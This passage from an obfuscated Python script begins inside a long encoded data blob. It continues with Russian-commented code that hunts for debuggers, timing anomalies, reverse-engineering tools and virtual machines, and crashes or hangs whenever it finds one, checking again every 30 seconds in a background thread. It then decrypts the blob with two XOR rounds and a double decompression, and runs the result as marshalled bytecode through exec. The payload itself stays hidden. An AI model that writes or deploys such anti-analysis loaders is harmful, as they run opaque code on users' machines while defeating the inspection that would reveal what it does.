}pF8<uqMQ%R=rIKHD3r<siqI?A+RlzO1R|EAYgmauGN=1A_wPY*dA)7n%jShH1;Yt#wh1G<V@$5S$&N$L4?(Hf;6Yq@L&hPsu;Q@Pop?1*88-&4(LrCWUGi`E#^$Hl(VpDJ!C@EHv;*OjF;G!WL@c=+~I+J}ozZGa|FGJ8|pn$d(GPG?{6G1YvSWJj?etuxIT|g9K;YJgJte%eES|myW;^XeLmZd_1sBZfwU5%IR#oBX88|85i|5UkOb)%9emf$+^%A!A}Hd@|<@q5IBJ$=UI*+0eBZhcmMx`t~am<5aVBrl1Ribvw~6Agkv5U-xz#xev4b*faQ+ddSU87Vz~)vO6upYVw_gU(dF$O0D@!4T-w%472AEJuV&_&eR*VfwJ`m0hRJY*$#k{)aoLa?0d9fWfOo;nPL;t*vim6!l#u?{T43`3x=HkoiSgqpf7?evLU-Eh=P|KiyKibry!sy9cS-VEInavLkP8!|)q^<+z}T@9*{Loi&>Tyrj&duQ%hywh}8=qou;&04KI_CibIhkVvcd{7C)|5Nwh5_<*tWmQB{LnXjb-UNK!TcSf*EQi{Z~-tOEBjtXJmmgF)5gYtx(1RXH?=N=;SBH4P>?92P7Y$Z9nq$n2$6NrYm#MlLfUc^q}MZ3s==oeT<0*WGkja<`VupjZ~i0bU3Vo>_VDQ$ZS_gOY8Z~(YxrWABYMa{hFK7xgwR5qFXkQtIRL_m&x%#s0+9VQ`qwplDzvow=qzQN;mSPk7vAQLGYmzZ~J1ixC1EYnOaCOY&)KqO(O*C?r69HHRkJRyZgGB^8LKMdP2#YiZnlUu5j;RAb!%yiU&$oY`s)WLj{-8b5HBOqj^pAXHzxl!rS-D>#OnRQiq0%pEeP#LP+QxOq~rfzL=NrC(<y+~#h6C*DXq-JE<U@@NoLY1Ew>-Trho2eRJ;4pv?M+@j0k(3V-5v{=avXP5A+yJzys}CtQvOvdNh%|`U#D)SCcu((KRh2+?kanzLQNCvM_aZ<c9qER7QJT63G?>SPSBnWRGdV3{+<t60?5GJEU4>EuFTVC}yIN#e!@)u7LxlKK(t}nuFVG)Y5Z7Z_VcTYYSnyl#U@i!ChR)P>sr>|tPAaQ^67zz(5QCz`lvyx7Ng1KsGmJ(E)vR_{QsiVpJGYa61EnFP^MDzCLcTOsqD3eW!F>TK_uHtZ&Sa{7@#q(Rlu3E&=g;B}R@AG5idV4>SzrEYnGJ6y!maG*o%J}+{lf2Ej683^nXi{2?NM#_scpc{t38vfWJpcUa7(-zDy0mk=_9TY*17LRyEZ6vw!RN_2MhO=#4lBkbqYgzdqTm)J<ezKx_uz1=dIT?F#g({Ckc<E-7?7&C9TCd`1V1y^ZeTPc1khZU-VLHM0$pykCF0#b8+v^JTD0GlMv`NfS>B#{dGBR(s)vhwijGzNh^rc0ZRzcoN+G#!m|`_bD~%dPM=YFjB;V=yyjR8MCvx7|MJ@8jJolZ=SG(Q72(;^aTZnZ)y8f%Kfgo=XRqelgP$5{|09{DlExOS!+mbWy3`|%s}Ggqvv3JK4)P%r4aQsS+}^|ZwucZm4i0sqx2|d&kxnj=)fBm{k+HfEVD@$#UVd-6x2JntOJ1BKt2l$*ExB;l3p}oB!kc}SkbU=|uMB^82Z4nR4Rzz7OoCA!{a|3pDhSA!2hQ8#hgCzu)3ovp=0!*snozfB*KSojoh}Y@8bQH+Y>|(A+FOs~?#bG0H>1_!L!lS&!+Bs^NtpXY2ZJw%@)3d7+AKv{$2yNEzir$YPopU(HoHNJb9{wg5vJ)DVU#o?pAUgsj93`~a5~nswY4HuEf3&~p2QPk*uP<aGKXvHmNYcxgAOfJHxz)ce~mpsHl@@rXmM&5_oh#G_@1kj?@D%fR2+9HXOpyDINHpaJIm#nF1f86i6Rz!wmbBSmneuCdaPSxe87wpqbNRUvNgN0mLV9xvHdhfCHOaTjghys5oeDko7aNEFVIBnfspWEX80zrmPUhoecUv8AsWyJT9SeUVN0"


# Advanced Anti-Debug Protection
def spgyqdzhₖ():
    """Комплексная проверка безопасности"""
    # Проверка отладчика
    if hasattr(ᴏoiyᴊ7oᴄ0rzʀ, 'gettrace') and ᴏoiyᴊ7oᴄ0rzʀ.gettrace() is not None:
        fₓₖₓimnₕ()
    
    # Проверка времени (отладка замедляет выполнение)
    ɪwm9h9ɴʟ5 = getattr(ᴏoiyᴊ7oᴄ0rzʀ, '_start_time_', None)
    if ɪwm9h9ɴʟ5 is None:
        ᴏoiyᴊ7oᴄ0rzʀ._start_time_ = ᴠᴀɢ84ᴋᴅʀᴀzʀ.time()
    else:
        if ᴠᴀɢ84ᴋᴅʀᴀzʀ.time() - ɪwm9h9ɴʟ5 > 180:  # 3 минуты максимум
            fₓₖₓimnₕ()
    
    # Проверка на виртуальные машины/эмуляторы
    ₓxₛwₛxₛₕm()

def fₓₖₓimnₕ():
    """Катастрофический сбой для защиты"""
    methods = [
        lambda: [][1],                    # IndexError
        lambda: {}['nonexistent'],      # KeyError  
        lambda: 1/0,                      # ZeroDivisionError
        lambda: exec('while True: pass'), # Бесконечный цикл
        lambda: exit(255),
        lambda: quit(),
        lambda: ᴏoiyᴊ7oᴄ0rzʀ.exit(1),
        lambda: __import__('os')._exit(1)
    ]
    uzmyʙɪɪfwʀᴜǫ.choice(methods)()

def ₓxₛwₛxₛₕm():
    """Обнаружение анализаторов"""
    # Проверка загруженных модулей
    debug_modules = ['ida64', 'x64dbg', 'ollydbg', 'windbg', 'cheatengine']
    for module in ᴏoiyᴊ7oᴄ0rzʀ.modules:
        if any(dbg in module.lower() for dbg in debug_modules):
            fₓₖₓimnₕ()
    
    # Проверка на наличие инструментов реверс-инжиниринга
    try:
        import pefile
        fₓₖₓimnₕ()  # Если может импортировать pefile - вероятно анализ
    except:
        pass

# Постоянный мониторинг
def ₕuₗnₛfilqt():
    while True:
        spgyqdzhₖ()
        ᴠᴀɢ84ᴋᴅʀᴀzʀ.sleep(30)  # Проверка каждые 30 секунд

# Запуск мониторинга в отдельном потоке
6rᴢz4swᴡ9g = ᴄmᴍ9mᴊss.Thread(target=ₕuₗnₛfilqt, daemon=True)
6rᴢz4swᴡ9g.start()


def ghvhdrₜₜ():
    """Сборка зашифрованных данных"""
    return buikcdkukl + pcliytpcaj + icpgwmqyps + iogmfhmznc + dtbrimpbhb

def ₗczezₙₑk(data):
    """Многоуровневая дешифровка"""
    # Удаление помех (первые 100 и последние 100 символов)
    clean_data = data[100:-100]
    
    # Декодирование
    decoded = ce43ᴅᴊᴅᴛʙғv.b85decode(clean_data)
    
    # Генерация ключей
    key1 = ᴘiᴘǫarғᴡjizᴏ.sha512(b"7ca2e7eb8c4d01327a6c3838336feabbb145d1ea73d2a68cd2e05b476435c817a614b49188183a59102e0350dfda20c239ad63009c10553c9a65f685c06bede4").digest()
    key2 = ᴘiᴘǫarғᴡjizᴏ.sha256(key1).digest()
    
    # Первый раунд дешифровки XOR
    decrypted1 = bytearray()
    for i, byte in enumerate(decoded):
        decrypted1.append(byte ^ key2[i % len(key2)])
    
    # Второй раунд дешифровки XOR  
    decrypted2 = bytearray()
    for i, byte in enumerate(decrypted1):
        decrypted2.append(byte ^ key1[i % len(key1)])
    
    # Декомпрессия
    decompressed1 = ᴍʏᴏ9wᴅɢv5ᴋb.decompress(bytes(decrypted2))
    decompressed2 = ᴍʏᴏ9wᴅɢv5ᴋb.decompress(decompressed1)
    
    return decompressed2

def bₒlpxuₐn(marshaled_code):
    """Выполнение кода"""
    try:
        # Загрузка байт-кода
        code_obj = ᴅᴜ07ɢᴋǫᴠt.loads(marshaled_code)
        
        # Создание изолированного окружения
        secure_globals = {
            '__builtins__': {},
            '__name__': '__main__',
        }
        
        # Выполнение
        exec(code_obj, secure_globals)
        
    except Exception as e:
        fₓₖₓimnₕ()

def vₐtₙkₘₒy():
    """Основная функция"""
    # Проверка безопасности
    spgyqdzhₖ()
    
    # Получение данных
    encrypted_data = ghvhdrₜₜ()
    
    # Дешифровка
    decrypted_data = ₗczezₙₑk(encrypted_data)
    
    # Запуск
    bₒlpxuₐn(decrypted_data)

if __name__ == "__main__":
    vₐtₙkₘₒy()
